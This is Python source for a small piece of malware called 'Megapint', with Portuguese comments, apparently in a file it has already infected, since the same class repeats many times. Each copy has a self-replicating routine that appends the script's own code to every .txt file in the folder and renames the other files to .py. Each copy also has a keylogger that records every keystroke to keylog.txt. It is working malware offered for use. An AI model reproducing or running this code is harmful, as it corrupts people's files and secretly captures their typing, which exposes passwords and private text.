    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
